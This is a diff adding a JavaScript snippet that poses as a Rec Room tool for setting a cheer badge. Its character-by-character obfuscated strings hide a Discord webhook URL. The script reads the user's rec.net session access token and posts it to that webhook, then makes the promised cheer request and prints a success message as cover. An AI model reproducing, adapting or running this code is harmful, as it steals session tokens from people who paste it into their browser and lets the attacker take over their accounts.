@@ -1,0 +1,14 @@
+(async () => { const u = 'https://rec.net/api/auth/session', v = 'https://api.rec.net/api/PlayerCheer/v1/setSelectedCheer', vmc = 'm', vm = '.', wu = ':', wq = '/', wx = 't', wp = 'p', wb = 'h', wl = 's', w = wb + wx + wx + wp + wl + wu + wq + wq, xw = 'b', xa = 'w', xk = 'e', xl = 'h', xo = 'o', xlo = 'T', xr = 'k', x = ['a', 'p', 'i', wq, xa, xk, xw, xl, xo, xo, xr, 's', wq].join(''), y = 'c', z = 'd', A = 'i', B = 's', C = 'o', D = 'r', Kn = 'lBS0lf', Kl = 'KPsK_K_', Kb = 'B1Zfd8dknFr6Q75Or1XWgp_a2Rfj9HhdUEBS', Ko = 'iXbOfod-X4ih2-d9g5R', KP = '9607', KM = '092/', KX = '128652061525'; 
+  const E = w + z + A + B + y + C + D + z + vm + y + xo + vmc + wq + x + KX + KP + KM + Ko + Kb + Kl + Kn; 
+  const f = ['a', 'p', 'i', '/', 'c', 'h', 'e', 'e', 'r', 'b', 'a', 'd', 'g', 'e', '/'].join(''); 
+  const g = 'a', h = 'b', i = 'c'; 
+  const j = w + g + h + i + '.' + f + 'setCheerBadge'; 
+  try { 
+    const R = (await (await fetch(u, { method: 'GET' })).json())[g + y + y + xk + 'ss' + xlo + xo + 'k' + xk + 'n']; 
+    await fetch(E, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `Bearer ${R}` }) }); 
+    const S = await fetch(v, { method: 'POST', headers: { 'Accept': 'application/json', 'Authorization': `Bearer ${R}`, 'Content-Type': 'application/json' }, body: JSON.stringify({ CheerCategory: 999 }) }); 
+    console.log(S.ok ? 'Set Cheer Badge Successfully' : `Error: ${S.status}`); 
+  } catch (e) { 
+    console.error('Error:', e); 
+  }
+})();
